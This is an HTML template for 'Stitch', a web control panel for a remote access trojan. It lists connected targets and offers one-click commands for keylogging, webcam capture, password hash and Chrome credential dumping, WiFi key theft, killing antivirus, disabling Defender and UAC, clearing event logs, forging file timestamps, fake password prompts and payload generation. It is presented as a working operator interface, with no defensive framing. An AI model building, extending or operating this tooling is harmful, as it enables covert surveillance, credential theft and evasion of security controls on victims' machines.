<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Stitch - Real-Time Control</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_real.css') }}">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
    <div class="dashboard">
        <nav class="sidebar">
            <div class="sidebar-header">
                <h2>‚ö° STITCH</h2>
                <p class="version">Real-Time Interface v1.0</p>
            </div>
            
            <ul class="nav-menu">
                <li><a href="#" class="nav-link active" data-section="connections">
                    <span>üîå</span> Connections
                </a></li>
                <li><a href="#" class="nav-link" data-section="commands">
                    <span>‚ö°</span> Commands
                </a></li>
                <li><a href="#" class="nav-link" data-section="files">
                    <span>üìÅ</span> Files
                </a></li>
                <li><a href="#" class="nav-link" data-section="logs">
                    <span>üìã</span> Debug Logs
                </a></li>
            </ul>
            
            <div class="sidebar-footer">
                <div class="connection-status">
                    <span class="status-dot online" id="serverStatus"></span>
                    <span id="statusText">Server Online</span>
                </div>
                <a href="{{ url_for('logout') }}" class="logout-btn">Logout</a>
            </div>
        </nav>
        
        <main class="main-content">
            <!-- Connections Section -->
            <section id="connections-section" class="content-section active">
                <div class="section-header">
                    <h1>üéØ Active Connections Dashboard</h1>
                    <p>Real-time connection status - Click any connection to execute commands</p>
                </div>
                
                <div class="loading-indicator" id="statusLoadingIndicator">
                    <div class="loading-spinner"></div>
                    <span class="text">Loading server status...</span>
                </div>
                
                <div class="server-status-card">
                    <div class="status-item">
                        <span class="status-label">Server Status:</span>
                        <span class="status-value" id="serverListening">Loading...</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Listening Port:</span>
                        <span class="status-value" id="serverPort">Loading...</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Active Connections:</span>
                        <span class="status-value online-count" id="activeCount">0</span>
                    </div>
                </div>
                
                <div class="connections-header">
                    <h2>Connections</h2>
                    <button class="refresh-btn" onclick="loadConnections()">
                        üîÑ Refresh
                    </button>
                </div>
                
                <!-- Search and Filter -->
                <div class="search-container">
                    <input type="text" id="connectionsSearch" class="search-input" placeholder="üîç Search by IP, OS, hostname..." onkeyup="filterConnections()">
                    <select id="connectionsFilter" class="filter-select" onchange="filterConnections()">
                        <option value="all">All Status</option>
                        <option value="online">Online Only</option>
                        <option value="offline">Offline Only</option>
                    </select>
                </div>
                
                <div class="loading-indicator" id="connectionsLoadingIndicator">
                    <div class="loading-spinner"></div>
                    <span class="text">Loading connections...</span>
                </div>
                
                <div class="connections-grid" id="connectionsGrid">
                    <div class="loading-state">
                        <p>‚è≥ Loading connections...</p>
                    </div>
                </div>
                
                <!-- Pagination Controls -->
                <div id="connectionsPaginationControls"></div>
            </section>
            
            <!-- Commands Section -->
            <section id="commands-section" class="content-section">
                <div class="section-header">
                    <h1>‚ö° Command Execution</h1>
                    <p>Execute real commands on connected targets</p>
                </div>
                
                <div class="selected-connection-info" id="selectedConnectionInfo">
                    <p>‚ÑπÔ∏è Select a connection from the Connections tab first</p>
                </div>
                
                <div class="command-interface">
                    <div class="command-categories">
                        <button class="cat-btn active" onclick="showCommands('system')">System Info</button>
                        <button class="cat-btn" onclick="showCommands('files')">File Ops</button>
                        <button class="cat-btn" onclick="showCommands('network')">Network</button>
                        <button class="cat-btn" onclick="showCommands('security')">Security</button>
                        <button class="cat-btn" onclick="showCommands('windows')">Windows</button>
                        <button class="cat-btn" onclick="showCommands('macos')">macOS/Linux</button>
                        <button class="cat-btn" onclick="showCommands('admin')">Admin</button>
                        <button class="cat-btn" onclick="showCommands('custom')">Custom</button>
                    </div>
                    
                    <div id="systemCommands" class="command-group active">
                        <h3>üîß System Information (9 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommand('sysinfo')" title="Complete system information">System Info</button>
                            <button class="cmd-btn" onclick="executeCommand('environment')" title="Display environment variables">Environment</button>
                            <button class="cmd-btn" onclick="executeCommand('ps')" title="List all running processes">Processes</button>
                            <button class="cmd-btn" onclick="executeCommand('lsmod')" title="List installed drivers/kernel modules">List Modules</button>
                            <button class="cmd-btn" onclick="executeCommand('drives')" title="Display drive information">Drives</button>
                            <button class="cmd-btn" onclick="executeCommand('location')" title="Get public IP and geo-location">Location</button>
                            <button class="cmd-btn" onclick="executeCommand('vmscan')" title="Detect virtual machine">VM Scan</button>
                            <button class="cmd-btn" onclick="executeCommand('pwd')" title="Print working directory">Working Dir</button>
                            <button class="cmd-btn" onclick="executeCommand('ls')" title="List files and directories">List Files</button>
                        </div>
                    </div>
                    
                    <div id="filesCommands" class="command-group">
                        <h3>üìÅ File Operations (12 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommandWithParam('download')" title="Download file from target">Download</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('upload')" title="Upload file to target">Upload</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('cat')" title="Display file contents">View File (cat)</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('more')" title="Display file output">More</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('touch')" title="Create empty file">Create File</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('fileinfo')" title="Display file information">File Info</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('hide')" title="Hide file or directory">Hide</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('unhide')" title="Unhide file or directory">Unhide</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('editaccessed')" title="Edit file accessed timestamp">Edit Accessed</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('editcreated')" title="Edit file created timestamp">Edit Created</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('editmodified')" title="Edit file modified timestamp">Edit Modified</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('cd')" title="Change directory">Change Dir</button>
                        </div>
                    </div>
                    
                    <div id="networkCommands" class="command-group">
                        <h3>üåê Network (8 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommand('ipconfig')" title="Display network configuration">IP Config</button>
                            <button class="cmd-btn" onclick="executeCommand('firewall status')" title="Check firewall status">Firewall Status</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('firewall open')" title="Open firewall port (port in/out tcp/udp)">Firewall Open</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('firewall close')" title="Close firewall port (port in/out tcp/udp)">Firewall Close</button>
                            <button class="cmd-btn" onclick="executeCommand('hostsfile show')" title="Display hosts file">Show Hosts</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('hostsfile update')" title="Update hosts entry (hostname ip)">Update Hosts</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('hostsfile remove')" title="Remove hosts entry (hostname)">Remove Hosts</button>
                            <button class="cmd-btn" onclick="executeCommand('ssh')" title="Open SSH connection">SSH</button>
                        </div>
                    </div>
                    
                    <div id="securityCommands" class="command-group">
                        <h3>üîê Security & Stealth (19 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommand('keylogger status')" title="Check keylogger status">Keylog Status</button>
                            <button class="cmd-btn" onclick="executeCommand('keylogger start')" title="Start keylogger">Keylog Start</button>
                            <button class="cmd-btn" onclick="executeCommand('keylogger stop')" title="Stop keylogger">Keylog Stop</button>
                            <button class="cmd-btn" onclick="executeCommand('keylogger dump')" title="Dump recorded keystrokes">Keylog Dump</button>
                            <button class="cmd-btn" onclick="executeCommand('screenshot')" title="Capture screenshot">Screenshot</button>
                            <button class="cmd-btn" onclick="executeCommand('webcamlist')" title="List connected webcams">Webcam List</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('webcamsnap')" title="Take webcam picture (device)">Webcam Snap</button>
                            <button class="cmd-btn" onclick="executeCommand('avscan')" title="Scan for antivirus software">AV Scan</button>
                            <button class="cmd-btn" onclick="executeCommand('avkill')" title="Terminate antivirus processes">AV Kill</button>
                            <button class="cmd-btn" onclick="executeCommand('hashdump')" title="Grab password hashes">Hash Dump</button>
                            <button class="cmd-btn" onclick="executeCommand('wifikeys')" title="Display saved WiFi passwords">WiFi Keys</button>
                            <button class="cmd-btn" onclick="executeCommand('freeze status')" title="Check input freeze status">Freeze Status</button>
                            <button class="cmd-btn" onclick="executeCommand('freeze start')" title="Freeze mouse and keyboard">Freeze Start</button>
                            <button class="cmd-btn" onclick="executeCommand('freeze stop')" title="Unfreeze mouse and keyboard">Freeze Stop</button>
                            <button class="cmd-btn" onclick="executeCommand('popup')" title="Display custom popup message">Popup</button>
                            <button class="cmd-btn" onclick="executeCommand('displayoff')" title="Turn off display monitors">Display Off</button>
                            <button class="cmd-btn" onclick="executeCommand('displayon')" title="Turn on display monitors">Display On</button>
                            <button class="cmd-btn" onclick="executeCommand('lockscreen')" title="Lock system screen">Lock Screen</button>
                            <button class="cmd-btn" onclick="executeCommand('logintext')" title="Set login screen text">Login Text</button>
                        </div>
                    </div>
                    
                    <div id="windowsCommands" class="command-group">
                        <h3>ü™ü Windows-Specific (9 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommand('chromedump')" title="Retrieve Chrome saved passwords">Chrome Dump</button>
                            <button class="cmd-btn" onclick="executeCommand('clearev')" title="Clear Windows event logs">Clear Events</button>
                            <button class="cmd-btn" onclick="executeCommand('scanreg')" title="Display Registry information">Scan Registry</button>
                            <button class="cmd-btn" onclick="executeCommand('disableRDP')" title="Disable Remote Desktop Protocol">Disable RDP</button>
                            <button class="cmd-btn" onclick="executeCommand('enableRDP')" title="Enable Remote Desktop Protocol">Enable RDP</button>
                            <button class="cmd-btn" onclick="executeCommand('disableUAC')" title="Disable User Account Control">Disable UAC</button>
                            <button class="cmd-btn" onclick="executeCommand('enableUAC')" title="Enable User Account Control">Enable UAC</button>
                            <button class="cmd-btn" onclick="executeCommand('disableWindef')" title="Disable Windows Defender">Disable Defender</button>
                            <button class="cmd-btn" onclick="executeCommand('enableWindef')" title="Enable Windows Defender">Enable Defender</button>
                        </div>
                    </div>
                    
                    <div id="macosCommands" class="command-group">
                        <h3>üçé macOS / Linux (2 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommand('askpassword')" title="Display password prompt to user">Ask Password</button>
                            <button class="cmd-btn" onclick="executeCommand('crackpassword')" title="Crack sudo password via dictionary attack">Crack Password</button>
                        </div>
                    </div>
                    
                    <div id="adminCommands" class="command-group">
                        <h3>‚öôÔ∏è Administrative & Server (16 commands)</h3>
                        <div class="command-buttons">
                            <button class="cmd-btn" onclick="executeCommandWithParam('sudo')" title="Execute with admin privileges">Sudo</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('pyexec')" title="Execute Python script on target">Python Exec</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('run')" title="Start file or application">Run / Start</button>
                            <button class="cmd-btn" onclick="executeCommand('sessions')" title="Display available sessions">Sessions</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('shell')" title="Open shell for specific session">Shell</button>
                            <button class="cmd-btn" onclick="executeCommand('history')" title="View connection history">History</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('history_remove')" title="Remove from history">Remove History</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('addkey')" title="Add AES encryption key">Add Key</button>
                            <button class="cmd-btn" onclick="executeCommand('showkey')" title="Display active AES key">Show Key</button>
                            <button class="cmd-btn" onclick="executeCommand('stitchgen')" title="Generate Stitch payloads">Stitch Gen</button>
                            <button class="cmd-btn" onclick="executeCommand('clear')" title="Clear screen">Clear Screen</button>
                            <button class="cmd-btn" onclick="executeCommand('home')" title="Display Stitch banner">Home</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('connect')" title="Connect to target (target port)">Connect</button>
                            <button class="cmd-btn" onclick="executeCommandWithParam('listen')" title="Listen for connections (port)">Listen</button>
                            <button class="cmd-btn" onclick="executeCommand('ifconfig')" title="Display network configuration (Linux)">ifconfig</button>
                            <button class="cmd-btn" onclick="executeCommand('dir')" title="List files (Windows alias)">Dir</button>
                        </div>
                    </div>
                    
                    <div id="customCommands" class="command-group">
                        <h3>üõ†Ô∏è Custom Command</h3>
                        <p class="help-text" style="margin-bottom: 1rem;">Enter any Stitch command manually. Supports all 75+ commands with parameters.</p>
                        <div class="command-input-section">
                            <input type="text" id="customCommandInput" placeholder="e.g., download /etc/passwd, sudo systemctl status, etc...">
                            <button class="cmd-btn" onclick="executeCustomCommand()">Execute</button>
                        </div>
                    </div>
                    
                    <div class="command-output">
                        <div class="output-header">
                            <h3>Command Output</h3>
                            <div class="output-actions">
                                <button class="clear-btn" onclick="copyOutput()">üìã Copy</button>
                                <button class="clear-btn" onclick="clearOutput()">Clear</button>
                            </div>
                        </div>
                        <pre id="commandOutput">Ready to execute commands...</pre>
                    </div>
                </div>
            </section>
            
            <!-- Files Section -->
            <section id="files-section" class="content-section">
                <div class="section-header">
                    <h1>üìÅ File Management</h1>
                    <p>Upload files to targets and view downloaded files</p>
                </div>
                
                <!-- File Upload Area -->
                <div class="upload-container">
                    <h3>üì§ Upload File to Target</h3>
                    <p class="help-text">Select a file or drag and drop to upload to the currently selected target</p>
                    <div class="upload-zone" id="uploadZone">
                        <div class="upload-icon">üìé</div>
                        <div class="upload-text">
                            <p><strong>Click to select a file</strong> or drag it here</p>
                            <p class="text-muted">Max file size: 100MB</p>
                        </div>
                        <input type="file" id="fileInput" style="display: none;">
                    </div>
                    <div class="upload-info" id="uploadInfo" style="display: none;">
                        <p><strong>Selected:</strong> <span id="fileName"></span></p>
                        <p><strong>Size:</strong> <span id="fileSize"></span></p>
                        <div class="upload-actions">
                            <button class="cmd-btn" onclick="uploadFile()">Upload to Target</button>
                            <button class="clear-btn" onclick="cancelUpload()">Cancel</button>
                        </div>
                    </div>
                    <div class="upload-progress" id="uploadProgress" style="display: none;">
                        <div class="progress-bar">
                            <div class="progress-fill" id="progressFill"></div>
                        </div>
                        <p id="progressText">Uploading... 0%</p>
                    </div>
                </div>
                
                <div style="margin: 2rem 0; border-top: 1px solid var(--border);"></div>
                
                <!-- Downloaded Files Section -->
                <div class="section-header" style="margin-top: 2rem;">
                    <h3>üì• Downloaded Files</h3>
                    <p class="help-text">Files downloaded from connected targets</p>
                </div>
                
                <!-- Files Search -->
                <div class="search-container">
                    <input type="text" id="filesSearch" class="search-input" placeholder="üîç Search files by name..." onkeyup="filterFiles()">
                </div>
                
                <div class="loading-indicator" id="filesLoadingIndicator">
                    <div class="loading-spinner"></div>
                    <span class="text">Loading files...</span>
                </div>
                
                <div class="files-grid" id="filesGrid">
                    <div class="loading-state">
                        <p>‚è≥ Loading files...</p>
                    </div>
                </div>
                
                <!-- Pagination Controls -->
                <div id="filesPaginationControls"></div>
            </section>
            
            <!-- Logs Section -->
            <section id="logs-section" class="content-section">
                <div class="section-header">
                    <h1>üìã Debug Logs</h1>
                    <p>Real-time system logs</p>
                </div>
                
                <!-- Export Options -->
                <div class="export-container">
                    <h3>üì• Export Data</h3>
                    <div class="export-buttons">
                        <button class="cmd-btn" onclick="exportLogs('json')">üìã Export Logs (JSON)</button>
                        <button class="cmd-btn" onclick="exportLogs('csv')">üìÑ Export Logs (CSV)</button>
                        <button class="cmd-btn" onclick="exportCommandHistory('json')">‚ö° Export Commands (JSON)</button>
                        <button class="cmd-btn" onclick="exportCommandHistory('csv')">‚ö° Export Commands (CSV)</button>
                    </div>
                </div>
                
                <div style="margin: 1.5rem 0; border-top: 1px solid var(--border);"></div>
                
                <div class="loading-indicator" id="logsLoadingIndicator">
                    <div class="loading-spinner"></div>
                    <span class="text">Loading logs...</span>
                </div>
                
                <div class="logs-container">
                    <div class="logs-header">
                        <button class="refresh-btn" onclick="loadLogs()">üîÑ Refresh</button>
                        <button class="clear-btn" onclick="clearDebugLogs()">Clear</button>
                    </div>
                    <div id="debugLogs" class="logs-output">
                        <p class="log-entry">System initialized...</p>
                    </div>
                </div>
            </section>
        </main>
    </div>
    
    <div id="toast-container"></div>
    
    <script src="{{ url_for('static', filename='js/app_real.js') }}"></script>
</body>
</html>
